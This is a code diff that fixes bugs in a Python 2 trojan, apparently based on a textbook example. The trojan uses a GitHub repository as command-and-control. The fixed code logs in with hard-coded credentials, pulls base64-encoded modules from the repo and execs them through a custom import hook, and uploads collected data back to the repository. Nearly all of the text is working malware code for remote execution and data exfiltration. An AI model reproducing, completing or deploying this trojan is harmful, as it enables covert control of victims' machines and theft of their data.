@@ -10,8 +10,8 @@ import random
 import threading
 import Queue
 import os
+import github3 
 
-from github3 import login
 
 trojan_id = "first"
 
@@ -23,7 +23,7 @@ task_queue = Queue.Queue()
 
 
 def connect_to_github():
-    gh = login(username="joeyfrancistribbiani", password="GitHub123")
+    gh = github3.login(username="joeyfrancistribbiani", password="GitHub123")
     repo = gh.repository("joeyfrancistribbiani", "Trojan")
     branch = repo.branch("master")
 
@@ -56,7 +56,7 @@ def get_trojan_config():
 
 def store_module_result(data):
     gh, repo, branch = connect_to_github()
-    remote_path = "data/%s/%d.data" % trojan_id, random.randint(1000, 100000)
+    remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
     repo.create_file(remote_path, "Commit message", base64.b64encode(data))
 
     return
@@ -66,22 +66,22 @@ class GitImporter(object):
     def __init__(self):
         self.current_module_code = ""
 
-        def find_module(self, fullname, path=None):
-            if configured:
-                print "[*] Attempting to retrieve %s" % fullname
-                new_library = get_file_contents("modules/%s" % fullname)
+    def find_module(self, fullname, path=None):
+        if configured:
+            print "[*] Attempting to retrieve %s" % fullname
+            new_library = get_file_contents("modules/%s" % fullname)
 
-                if new_library is not None:
-                    self.current_module_code = base64.b64decode(new_library)
-                    return self
-            return None
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        return None
 
-        def load_module(self, name):
-            module = imp.new_module(name)
-            exec self.current_module_code in module.__dict__
-            sys.modules[name] = module
+    def load_module(self, name):
+        module = imp.new_module(name)
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
 
-            return module
+        return module
 
 
 def module_runner(module):
